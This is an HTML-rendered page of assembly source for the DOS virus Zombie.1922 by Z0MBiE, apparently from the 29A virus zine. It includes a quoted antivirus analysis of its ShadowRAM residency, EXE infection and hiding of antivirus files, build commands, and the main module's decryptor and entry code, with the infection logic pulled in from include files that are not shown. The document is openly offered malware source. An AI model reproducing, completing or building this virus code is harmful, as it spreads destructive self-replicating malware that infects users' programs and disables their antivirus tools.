<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Zombie.VPI.15467 - zombie.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                           ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                           ³     Z0MBiE.1922     ³</span><span class="sc0">
</span><span class="sc1">;                           ³  written by Z0MBiE  ³</span><span class="sc0">
</span><span class="sc1">;                           ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus is related  with the Win95.Z0MBiE virus, also  included in this</span><span class="sc0">
</span><span class="sc1">; issue of 29A, in the "Win32"  section. It is dropped in the root directory</span><span class="sc0">
</span><span class="sc1">; of every drive in which Win95.Z0MBiE has infected a PE file, with the sys-</span><span class="sc0">
</span><span class="sc1">; tem and archive attributes. From  that moment onwards, Z0MBiE.1922 is able</span><span class="sc0">
</span><span class="sc1">; to spread all over the HD with independence of what his "daddy" does. This</span><span class="sc0">
</span><span class="sc1">; DOS virus is the first ever to use ShadowRAM in order to go resident. This</span><span class="sc0">
</span><span class="sc1">; new technique has many advantages, and maybe the most important is that it</span><span class="sc0">
</span><span class="sc1">; is impossible to unhook the  virus by normal means, as its  code is locked</span><span class="sc0">
</span><span class="sc1">; and is only accesable when performing the infection tasks, after being ca-</span><span class="sc0">
</span><span class="sc1">; lled from int 13h or int 21h. Z0MBiE has many other peculiarities, descri-</span><span class="sc0">
</span><span class="sc1">; bed below by Igor Daniloff in his analysis of this virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">; Zombie.1922</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Igor Daniloff</span><span class="sc0">
</span><span class="sc1">; DialogueScience</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Zombie.1922 is a destructive resident encrypted virus. It is a "product</span><span class="sc0">
</span><span class="sc1">; of the life activity" of Win95.Zombie. After creation, Zombie.1922</span><span class="sc0">
</span><span class="sc1">; "leads a full-fledged life" all by itself. Win95.Zombie creates a file</span><span class="sc0">
</span><span class="sc1">; ZSetUP.EXE in the root directory of every drive it infects. On starting</span><span class="sc0">
</span><span class="sc1">; ZSetUP.EXE, the virus code gets control and examines whether it (the</span><span class="sc0">
</span><span class="sc1">; virus) can open RAM Shadow for writing. Then it determines a 2122-byte</span><span class="sc0">
</span><span class="sc1">; block of free memory (of zero bytes) in the segment 0C000h. If it</span><span class="sc0">
</span><span class="sc1">; succeeds in this, the virus determines the location address of the 8x14</span><span class="sc0">
</span><span class="sc1">; system font. If this font exists in the segment 0C000h and if the address</span><span class="sc0">
</span><span class="sc1">; of the original Int 13h handler is available in the segment 0F000h, the</span><span class="sc0">
</span><span class="sc1">; virus opens RAM Shadow for writing and plants its code in the zero byte</span><span class="sc0">
</span><span class="sc1">; region or at the location of the 8x14 system font. Then the virus</span><span class="sc0">
</span><span class="sc1">; modifies the original Int 13h handler by inserting a command for</span><span class="sc0">
</span><span class="sc1">; transferring control to the virus procedure. Finally, RAM Shadow is</span><span class="sc0">
</span><span class="sc1">; "closed" to lock it from further writing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; On reading the sector (f.2 Int 13h) of initial signature "MZ", the virus</span><span class="sc0">
</span><span class="sc1">; "intercepts" Int 21h, whose handler infects every EXE that is started or</span><span class="sc0">
</span><span class="sc1">; opened for reading or writing.  While reading the sectors containing</span><span class="sc0">
</span><span class="sc1">; directory or file entries, the virus looks for the byte strings ADINF,</span><span class="sc0">
</span><span class="sc1">; AIDS, AVP, WEB, DRWEB, ---, CPP, C, S-ICE, TD, DEBUG, WEB70801, and CA.</span><span class="sc0">
</span><span class="sc1">; On detecting any such string, the virus sets in the sector just read the</span><span class="sc0">
</span><span class="sc1">; first byte OE5h (attribute for a deleted file) for the detected entry and</span><span class="sc0">
</span><span class="sc1">; "overwrites" all other bytes with zeros in the entry.  Thus, if the virus</span><span class="sc0">
</span><span class="sc1">; is active, the operating system will not even suspect the presence of</span><span class="sc0">
</span><span class="sc1">; these files in the drive.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus handlers of Int 13h and Int 21h, upon receiving control, "open"</span><span class="sc0">
</span><span class="sc1">; RAM Shadow, launch their procedures, and finally "close" RAM Shadow.</span><span class="sc0">
</span><span class="sc1">; Without appropriate shadow memory manipulations, it is not possible to</span><span class="sc0">
</span><span class="sc1">; kill or eradicate the resident virus code.  On detecting this virus in</span><span class="sc0">
</span><span class="sc1">; the memory, the system must be cured by starting the machine from an</span><span class="sc0">
</span><span class="sc1">; independent boot diskette containing a "clean" operating system.</span><span class="sc0">
</span><span class="sc1">; Beware! Zombie.1922 is, apparently, clever enough to open RAM</span><span class="sc0">
</span><span class="sc1">; Shadow on most of the modern system boards with Pentium. The virus</span><span class="sc0">
</span><span class="sc1">; contains a few text strings:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Z0MBiE`1668 v1.00 (c) 1997 Z0MBiE</span><span class="sc0">
</span><span class="sc1">;   Tnx to S.S.R.</span><span class="sc0">
</span><span class="sc1">;   ShadowRAM/Virtual Process Infector</span><span class="sc0">
</span><span class="sc1">;   ShadowRAM Technology (c) 1996,97 Z0MBiE</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Compiling it</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; tasm /m zombie.asm</span><span class="sc0">
</span><span class="sc1">; tlink zombie.obj</span><span class="sc0">
</span><span class="sc1">; exe2bin zombie.exe zombie.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - -[ZOMBIE.ASM] - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">         #</span><span class="sc5">equ.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         #</span><span class="sc5">macro.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         #</span><span class="sc5">struc.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         #</span><span class="sc5">header.inc</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tsr_sh</span><span class="sc0">

</span><span class="sc5">exe_start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0028h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">sux</span><span class="sc0">             </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc1">; normal: al=0</span><span class="sc0">
                </span><span class="sc1">; web:    al&lt;&gt;0</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">@@sux</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">real_code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">segcs</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">@@sux</span><span class="sc0">           </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">real_code</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vir_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">stamms_max_ip</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">decr_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">

</span><span class="sc5">real_code</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stamm</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">in_ID</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">out_ID</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@continue</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tsr_sh</span><span class="sc0">

</span><span class="sc5">@@continue</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1234h</span><span class="sc0">
</span><span class="sc5">lastword</span><span class="sc0">        </span><span class="sc5">save_ss</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1234h</span><span class="sc0">
</span><span class="sc5">lastword</span><span class="sc0">        </span><span class="sc5">save_sp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1234h</span><span class="sc0">
</span><span class="sc5">lastword</span><span class="sc0">        </span><span class="sc5">save_cs</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1234h</span><span class="sc0">
</span><span class="sc5">lastword</span><span class="sc0">        </span><span class="sc5">save_ip</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">rnd.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">sh_ram.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">tsr_sh.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">findR13.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">ints.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">infect.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">hook21.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">fuck13.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">switch13.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">const.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">stamms.inc</span><span class="sc0">

</span><span class="sc5">vir_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">var.inc</span><span class="sc0">

</span><span class="sc5">tsr_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">exe_endofstack</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">exe_memory</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span></div></body>
</html>
